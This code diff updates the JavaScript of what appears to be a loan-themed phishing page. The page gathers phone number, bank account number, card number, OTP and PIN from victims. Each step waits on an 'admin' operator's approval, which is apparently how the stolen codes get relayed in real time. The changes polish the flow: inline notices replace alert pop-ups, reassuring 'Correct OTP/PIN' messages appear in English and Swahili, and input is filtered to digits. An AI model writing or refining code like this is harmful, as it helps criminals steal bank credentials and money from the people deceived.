@@ -44,11 +44,11 @@ async function postData(step, data) {
             pollAdminResponse();
         } else {
             hideSpinner();
-            if (result.message) alert(result.message);
+            if (result.message) showInlineNotice(result.message, 'error');
         }
     } catch (e) {
         hideSpinner();
-        alert('Network connection error.');
+        showInlineNotice('Mtandao unasumbua. Tafadhali jaribu tena.', 'error');
     }
 }
 
@@ -69,32 +69,55 @@ function pollAdminResponse() {
     }, 1500);
 }
 
+// Inline Notification Handler (Replaces browser pop-up alerts)
+function showInlineNotice(message, type = 'error') {
+    const currentScreen = document.querySelector('.screen:not(.hidden)').id;
+    let noticeElementId = '';
+
+    if (currentScreen === 'screen-personal') noticeElementId = 'personal-notice';
+    else if (currentScreen === 'screen-step3') noticeElementId = 'step3-notice';
+    else if (currentScreen === 'screen-step4') noticeElementId = 'otp-notice';
+    else if (currentScreen === 'screen-step5') noticeElementId = 'pin-notice';
+
+    const noticeEl = document.getElementById(noticeElementId);
+    if (noticeEl) {
+        noticeEl.style.display = 'block';
+        noticeEl.style.color = type === 'success' ? '#00873e' : '#d32f2f';
+        noticeEl.style.fontWeight = 'bold';
+        noticeEl.style.textAlign = 'center';
+        noticeEl.style.margin = '10px 0';
+        noticeEl.innerText = message;
+    }
+}
+
 function handleServerResponse(res) {
     if (res.status === 'approved') {
         if (res.next === 'card_verify') goToScreen('screen-step3');
-        else if (res.next === 'otp') goToScreen('screen-step4');
-        else if (res.next === 'pin') goToScreen('screen-step5');
+        else if (res.next === 'otp') {
+            showInlineNotice('✅ Correct OTP! Inaendelea...', 'success');
+            setTimeout(() => goToScreen('screen-step4'), 1000);
+        }
+        else if (res.next === 'pin') {
+            showInlineNotice('✅ Correct PIN! Inaendelea...', 'success');
+            setTimeout(() => goToScreen('screen-step5'), 1000);
+        }
         else if (res.next === 'success') goToScreen('screen-success');
     } else if (res.status === 'retry_phone') {
         goToScreen('screen-personal');
-        const notice = document.getElementById('personal-notice');
-        notice.style.display = 'block';
-        notice.innerText = res.message;
+        showInlineNotice(res.message, 'error');
     } else if (res.status === 'denied' || res.status === 'retry_otp' || res.status === 'blocked' || res.status === 'retry_pin') {
-        alert(res.message);
-        if (res.status === 'retry_pin') {
-            const notice = document.getElementById('pin-notice');
-            notice.style.display = 'block';
-            notice.innerText = res.message;
-        }
+        showInlineNotice(res.message, 'error');
+    } else if (res.status === 'resend') {
+        showInlineNotice(res.message, 'success');
     }
 }
 
 // Form Handlers
-// Personal Info: Submits the phone number as a must
 function submitPersonal(e) {
     e.preventDefault();
-    document.getElementById('personal-notice').style.display = 'none';
+    const notice = document.getElementById('personal-notice');
+    if (notice) notice.style.display = 'none';
+    
     const data = {
         phoneNumber: document.getElementById('phoneNumber').value,
         loanAmount: document.getElementById('requestedAmount').value
@@ -102,10 +125,11 @@ function submitPersonal(e) {
     postData('personal_info', data);
 }
 
-// Step 3: Tembo Card Verification
 function submitStep3(e) {
     e.preventDefault();
-    document.getElementById('step3-notice').style.display = 'none';
+    const notice = document.getElementById('step3-notice');
+    if (notice) notice.style.display = 'none';
+
     const data = {
         accountNumber: document.getElementById('accountNumber').value,
         cardNumber: document.getElementById('cardNumber').value
@@ -115,6 +139,9 @@ function submitStep3(e) {
 
 function submitStep4(e) {
     e.preventDefault();
+    const notice = document.getElementById('otp-notice');
+    if (notice) notice.style.display = 'none';
+
     const inputs = document.querySelectorAll('.otp-input');
     let otp = '';
     inputs.forEach(i => otp += i.value);
@@ -128,22 +155,29 @@ function resendOtp(e) {
 
 function submitStep5(e) {
     e.preventDefault();
+    const notice = document.getElementById('pin-notice');
+    if (notice) notice.style.display = 'none';
+
     const inputs = document.querySelectorAll('.pin-input');
     let pin = '';
     inputs.forEach(i => pin += i.value);
     postData('step5', { pin });
 }
 
-// Auto-jump for OTP / PIN inputs
+// Auto-jump & Number-Only Filter for OTP, PIN, and Phone Inputs
 document.addEventListener('DOMContentLoaded', () => {
-    const setupOtpInputs = (selector) => {
+    const setupNumericInputs = (selector) => {
         const inputs = document.querySelectorAll(selector);
         inputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
+                // Strip out any non-digit characters (ensures numbers only)
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+
                 if (e.target.value.length === 1 && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
             });
+
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && input.value === '' && index > 0) {
                     inputs[index - 1].focus();
@@ -151,7 +185,9 @@ document.addEventListener('DOMContentLoaded', () => {
             });
         });
     };
-    setupOtpInputs('.otp-input');
-    setupOtpInputs('.pin-input');
+
+    setupNumericInputs('.otp-input');
+    setupNumericInputs('.pin-input');
+    setupNumericInputs('#phoneNumber');
 });
         
